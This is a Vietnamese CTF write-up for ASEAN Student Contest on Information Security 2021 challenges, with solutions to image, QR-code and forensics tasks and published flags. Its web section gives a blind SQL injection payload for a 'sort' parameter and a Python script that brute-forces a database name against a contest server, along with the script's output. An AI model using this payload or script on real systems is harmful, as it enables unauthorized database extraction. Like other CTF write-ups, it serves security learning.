# ASEAN STUDENT CONTEST ON INFORMATION SECURITY 2021

### Overview
 | Title | Category | Points | Flag
 | ------ | ------ | ------ | ------ |
 | [Hello world](#Hello-world) | MISC | 100 | `ASCIS{th1$_1$_4_fl4g}` |
 | [PNG](#PNG) | MISC | 100 | `ASCIS{png_h1dd3n_d4t4}` |
 | [travel paper](#travel-paper) | MISC | 100 | `ASCIS{c0r0n4_v1rus_1s_g0n3}` |
 | [Sherlock Homes](#Sherlock-Homes) | MISC | 451 | `Chưa tìm được` |
 | [FSM](#FSM) | RE | 100 |  |
 | [trace me](#trace-me) | RE | 139 |  |
 | [ghost reg](#ghost-reg) | RE | 436 |  |
 | [script kiddie](#script-kiddie) | WEB | 100 | `ASCIS{ssalchtiwesmihcueymor}` |
 | [script kiddie](#script-kiddie) | WEB | 100 |  |
 | [script kiddie](#script-kiddie) | WEB | 100 |  |
 
# Hello world
 
### Challenge
 
<img src=files/1.png>
 
### Solution

* Tìm trong source của trang web.

<img src=files/2.png>

# PNG
 
### Challenge
 
<img src=files/3.png>

[vcs.png](files/vcs.png)

### Solution

* Ta nhận được file png.

<img src=files/4.png>

* Vậy cờ nằm ở phần còn lại của bức hình. Sử dụng công cụ [TweakPNG](http://entropymine.com/jason/tweakpng/) để thay đổi size hình.

<img src=files/5.png>

* Sau khi thay đổi, ta có phần còn lại của hình có chứa cờ.

<img src=files/6.png>

# travel paper
 
### Challenge
 
<img src=files/7.png>
 
### Solution

* Truy cập netcat ta được QR Code.

<img src=files/8.png>

* Viết chương trình tự động submit qr code.

*(Code này của anh Hiếu team mình, anh Hiếu code python để đọc QR Code xịn lắm nghen 😆)*

* Code bạn đọc tham khảo có thể lấy ở đây:
 * [qrcode_solve.py](files/qrcode_solve.py)
 * [clacon.ttf](files/clacon.ttf)

```python
#!/usr/bin/python3
from PIL import Image, ImageFont, ImageDraw
from pyzbar.pyzbar import decode


def qrimg(lines, filename, sub=1):
    size_ = 500
    font = ImageFont.truetype('clacon.ttf', size=20)  
    img=Image.new("RGBA", (size_, size_),(255,255,255))
    draw = ImageDraw.Draw(img)  
    y_text = 8
    for line in lines:  
        # line = unicode(line, "utf-8")
        width, height = font.getsize(line)
        draw.text((0,y_text),line,(0,0,0), font=font)  
        y_text += height - sub
        draw = ImageDraw.Draw(img)  
    img.save(filename)

# Hàm này nhận một dòng (line) từ socket
def receive_one_line(s):
    r = b''

    # Lần lượt nhận từng ký tự, nếu là ký tự xuống dòng thì ngưng
    while (True):
        t = s.recv(1)
        if t == b'\n': break
        r = r + t

    # Trả về kết quả dạng string
    return r.decode()

# Hàm này gửi một dòng (line) đến socket
def send_one_line(s, data):
    # Bỏ hết ký tự xuống dòng trong data (nếu có) và gửi đến server
    data = data.strip()
    s.send((data + '\n').encode())

import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('125.235.240.166',20123))

banner = receive_one_line(s)
print(banner)

while('ASCIS{' not in banner):
    banner = receive_one_line(s)
    print(banner)
    save = []
    if 'Person' in banner:
        banner = receive_one_line(s)
        banner = receive_one_line(s)
        banner = receive_one_line(s)
        while(banner.strip() != ''):
            print(banner)
            save.append(banner)
            banner = receive_one_line(s)

        data = ''
        flag = False
        sub = 0.8
        while(flag == False and sub < 1.1):
            print(f"Sub: {sub}")
            qrimg(save, 'sub.png', sub)
            data = decode(Image.open('sub.png'))[0].data.decode()
            # if there is a QR code
            # print the data
            if data != '':
                print(f"QRCode data: {data}")
                flag = True
            else:
                sub += 0.1
        
        data = data.split('|')
        send_one_line(s, data[0])
        send_one_line(s, data[1])
        send_one_line(s, data[2])


```

* Kết quả chạy đến qr code thứ 100 là có cờ.

<img src=files/9.png>

# Sherlock Homes
 
### Challenge
 
<img src=files/a.png>

[2021-10-15T084431_DESKTOP-558KS6A.zip](files/2021-10-15T084431_DESKTOP-558KS6A.zip)
 
### Solution

* Giải nén ra được file vhxd. Tiếp tục mount ra ổ đĩa ta được như sau.

<img src=files/b.png>

* Dùng lệnh `grep` để tìm file có chứa cờ.

<img src=files/c.png>

* Đọc file ta được thông tin sau: `D:\Work\CONFIDENTAL\ProjectX\2021\SECRET\ASCIS{NTF$_!S_G00D}.txt`

* Submit cờ thì không được. Đến đây thì chưa tìm được hướng giải.

# FSM
 
### Challenge
 
<img src=files/d.png>

[fsm_B6CB40CE8F1E1C0B71B376A259F42C8F.exe](files/fsm_B6CB40CE8F1E1C0B71B376A259F42C8F.exe)

# trace me
 
### Challenge
 
<img src=files/e.png>

[re02.zip](files/re02.zip)

# ghost reg
 
### Challenge
 
<img src=files/f.png>

[re01.zip](files/re01.zip)

# script kiddie
 
### Challenge
 
<img src=files/10.png>

### Solution

* Truy cập trang ta được nội dung sau.

<img src=files/11.png>

* Dùng sqlmap để dump database.

<img src=files/12.png>

* Kết quả là không dump được nhưng ta có được payload sau để inject.

`sort=(SELECT (CASE WHEN (8704=8704) THEN 'name' ELSE (SELECT 3137 UNION SELECT 5500) END))`

* Sửa lại payload để guess db_name như sau.

`sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+len(db_name(0))+UNION+SELECT+22)+END))`

* db_name(0): là db thứ 1

* 22: là độ dài db name (số 22 này là mình bruteforce ra được)

* Code dùng để bruteforce như sau.

```python
import time
import requests
import string

# proxyDict = {"http":"http://127.0.0.1:8080"}

#Get length db_name()
def database_len(i):
	flag = True
	j = 0
	while flag == True:
		url = "http://167.172.85.253/web100/?sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+len(db_name({}))+UNION+SELECT+{})+END))".format(i, j)
		# response = requests.get(url, proxies=proxyDict)
		response = requests.get(url)
		if "Error" not in response.text:
			flag = False
			break
		j = j + 1			
	return j		
			
#Bruteforce 10 db_name()			
def database_name():
	print('Brute force Database name...')
	for dlen in range(0,10):
		length = database_len(dlen)
		text = "db_name({}): {}".format(dlen, length)
		print(text)
		i = 1
		name = ""
		while i < length:
			for j in string.printable:
				url = "http://167.172.85.253/web100/?sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+ascii(substring(db_name({}),{},1))+UNION+SELECT+ascii('{}'))+END))".format(dlen, i, j)
				# response = requests.get(url, proxies=proxyDict)
				response = requests.get(url)
				if "Error" not in response.text:
					name = name + j
					i = i + 1
					print(name)
					break	
		print("Database name is:", name)

def main():
    database_name()

if __name__ == '__main__':
    	main()


```

* Kết quả ta có được db_name

```
Brute force Database name...
db_name(0): 22
s
ss
ssa
ssal
ssalc
ssalch
ssalcht
ssalchti
ssalchtiw
ssalchtiwe
ssalchtiwes
ssalchtiwesm
ssalchtiwesmi
ssalchtiwesmih
ssalchtiwesmihc
ssalchtiwesmihcu
ssalchtiwesmihcue
ssalchtiwesmihcuey
ssalchtiwesmihcueym
ssalchtiwesmihcueymo
ssalchtiwesmihcueymor
Database name is: ssalchtiwesmihcueymor
```



















